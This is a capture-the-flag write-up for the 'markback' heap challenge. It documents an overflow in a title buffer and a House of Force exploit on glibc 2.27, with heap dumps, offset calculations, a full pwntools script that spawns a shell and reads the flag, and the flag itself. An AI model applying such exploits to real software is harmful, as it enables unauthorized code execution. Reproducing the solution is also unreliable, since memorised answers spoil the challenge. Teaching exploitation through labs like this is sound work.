# markback

[library.m0unt41n.ch/challenges/markback](https://library.m0unt41n.ch/challenges/markback) ![](../../resources/pwn.svg) ![](../../resources/hard.svg) 

# TL;DR

Heap exploitation.

Honestly, this felt more like "easy-medium". We get the glibc (that can be used with
[pwninit](https://github.com/io12/pwninit) for easy reproduce) and the challenge text provides a link to
[House Of Force](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_force.c) -
which is pretty much a description of the solution &#128578;

# The code

We have a static structure:

```c
typedef struct {
    char *title;
    int paragraph_count;
    char *paragraphs[MAX_PARAGRAPHS];
    char *licence;
} Document;
```

... and a dialog UI where we can:

*   Add a text as "paragraph" (up to `MAX_PARAGRAPHS`)
*   Export title and paragraphs as a simple markdown
*   Set the title
*   Get some internal information about the document

## "debug console"

There is also an additional `debug_console()` function, triggered by typing `1337` - and that launches
a shell. But calling that is gated with a static variable, set to zero and never modified:

```c
int debug = 0;

(...)

case 1337:  if(debug) {
    debug_console(); break;
}
```

## "internal information"

That "internal information" is actually rather meaningful:

```bash
document title: not title set
paragraphs: 0
document identifier: 93973599605888
licence: Use of this product includes a limited free trial, with a license required for continued access afterward.
licence identifier: 93973012025784
```

The "identifiers" there are just memory offsets of, respectively, `Document` struct and `licence` string.

# The bug

```c
#define MAX_TITLE_LENGTH 32

void set_title(Document *doc) {
    printf("New title: ");
    fgets(doc->title, 49, stdin);
    printf("set title to: %s\n\n", doc->title);
}
```

The title string is allocated as fixed 32 bytes, but `set_title()` **allows up to 49 characters**.
Which, conveniently, is exactly what is needed to overwrite the header of the top heap chunk

# The heap

(I used `vis_heap_chunks` from [pwndbg](https://github.com/pwndbg/pwndbg))

After starting the program and changing the title, the heap looks as follows:

*   The header (starts at `[heap]` address in process map, contains `tcache_perthread_struct`):

    ```bash
    0x555555a01000  0x0000000000000000  0x0000000000000251  ........Q.......
    0x555555a01010  0x0000000000000000  0x0000000000000000  ................
    0x555555a01020  0x0000000000000000  0x0000000000000000  ................
    0x555555a01030  0x0000000000000100  0x0000000000000000  ................
    0x555555a01040  0x0000000000000000  0x0000000000000000  ................
    ..............
    0x555555a01250  0x0000000000000000  0x0000000000000231  ........1.......
    ```

*   A free chunk of `0x230` bytes (`tcachebins[0x230][0/1]`) - probably leftover of some initialization

    ```bash
    0x555555a01260  0x0000000000000000  0x0000555555a01010  ...........UUU..	 
    0x555555a01270  0x0000000000000000  0x0000000000000000  ................
    ..............
    0x555555a01470  0x0000000000000000  0x0000000000000000  ................
    0x555555a01480  0x00007ffff7be7d60  0x00000000000000c1  `}..............
    ```

*   The `doc` structure:

    ```bash
    0x555555a01490  0x0000555555a01550  0x0000000000000000  P..UUU..........  # *title, paragraph_count
    0x555555a014a0  0x0000000000000000  0x0000000000000000  ...UUU.....UUU..  # *paragraphs[20]
    0x555555a014b0  0x0000000000000000  0x0000000000000000  ...UUU..........
    0x555555a014c0  0x0000000000000000  0x0000000000000000  ................
    0x555555a014d0  0x0000000000000000  0x0000000000000000  ................
    0x555555a014e0  0x0000000000000000  0x0000000000000000  ................
    0x555555a014f0  0x0000000000000000  0x0000000000000000  ................
    0x555555a01500  0x0000000000000000  0x0000000000000000  ................
    0x555555a01510  0x0000000000000000  0x0000000000000000  ................
    0x555555a01520  0x0000000000000000  0x0000000000000000  ................
    0x555555a01530  0x0000000000000000  0x0000000000000000  ................
    0x555555a01540  0x00005555554011b8  0x0000000000000031  ..@UUU..1.......  # licence. Next chunk: 0x30b
    ```

*   The `doc->title` string (nominally 32, useable 40, can overflow up to 49)

    ```bash
    0x555555a01550  0x4954495449544954  0x4954495449544954  TITITITITITITITI
    0x555555a01560  0x4954495449544954  0x4954495449544954  TITITITITITITITI
    0x555555a01570  0x0a74697469746974  0x0000000000000021  tititit.!.......  # Next chunk: 0x20b
    ```

With these specific offsets, the `debug` variable is located at `0x55555560204c`.
With 16b alignment, that's `0x555555602040`

# House of Force

The [idea described in the linked code](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_force.c) (enabled by a bug in glibc-2.27) is:

*   (First, we need to get all these offsets from a running program. But, we get these from "internal information")
*   Overflow the length of the top chunk to `-1` (`INT_MAX`, making glibc think that we have entire memory free to allocate)
*   "allocate" a very large chunk of RAM, that will end **just before the variable which we need to overwrite** (`debug` in our case)
*   Then, "allocate" a smaller chunk, which will go over that variable
*   And then, write to that chunk.

With above offsets, that would amount to:

*   Get `license_addr` from the program (`93824990843320` -> `0x5555554011b8`)
*   Get `doc_addr` from the program (`93824997135504` -> `0x555555a01490`)
*   Calculate `debug_addr`, by adding delta between known offsets above:
    `license_addr + 0x55555560204c - 0x5555554011b8`
*   `debug_aligned` = `debug_addr & 0xFFFFFFFFFFFFFFF0`
*   Calculate the length of the "very large chunk" (subtracting 16 for the chunk metadata):<br>
    `chunk_len = debug_aligned - doc_addr + 0x0000555555a01580 - 0x0000555555a01490 - 16`
*   Set title to:
    *   32 bytes of regular text `TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT`
    *   8 bytes to use the "useable" part of a 16B-aligned chunk `tttttttt`
    *   `pwn.p64(-1)`, to make glibc think that the top free chunk covers entire RAM already
*   Add a paragraph, telling the program that the length is `chunk_len` calculated above. Give it only some short text.
*   Add another, short paragraph  (24 bytes results in a smallest possible chunk). Give it 16 characters.

The last step will overwrite the `debug` variable and unlock the `1337` option.

# The code

```python
import pwn
import re

exe = pwn.ELF("chall_patched")
io = pwn.process([exe.path])

# Get to the first prompt
io.readuntilS(b" > ")

# Get offsets
io.sendline(b"4")
s = io.readuntilS(b" > ")

# Calculate doc_addr and license_addr
doc_addr = int(re.search(r'document identifier: ([0-9]*)', s, re.MULTILINE).group(1))
license_addr = int(re.search(r'licence identifier: ([0-9]*)', s, re.MULTILINE).group(1))

# Calculate other offsets
debug_addr = license_addr + 0x000055555560204c - 0x00005555554011b8
debug_aligned = debug_addr & 0xFFFFFFFFFFFFFFF0
old_top = doc_addr + 0x0000555555a01580 - 0x0000555555a01490
chunk_len = debug_aligned - old_top - 16

# Set title, overflow top chunk
io.sendline(b"3")
io.readuntilS(b"New title: ")
io.send((32*b'T')+(8*b't')+pwn.p64(0xFFFFFFFFFFFFFFFF))
io.readuntilS(b" > ")

# Add long paragraph
io.sendline(b"1")
io.readuntilS(b"New paragraph length: ")
io.sendline(str(chunk_len).encode('utf-8'))
io.readuntilS(b"New paragraph content: ")
io.sendline(b'blah')
io.readuntilS(b" > ")

# Add paragraph overlapping with debug
io.sendline(b"1")
io.readuntilS(b"New paragraph length: ")
io.sendline(b"24")
io.readuntilS(b"New paragraph content: ")
io.sendline(b'A'*16)
io.readuntilS(b" > ")

# Start the shell
io.sendline(b"1337")
io.readuntilS(b"launching debug console:")
io.sendline(b"cat flag.txt")
flag = io.readuntilS(b"}")[1:]
print(flag)
io.sendline(b"exit")
io.readuntilS(b" > ")
io.sendline(b"5")
io.close()
```

This works &#128578;

---

## `stairctf{f0rc3_y0ur_w4y_t0_th3_f1ag!}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
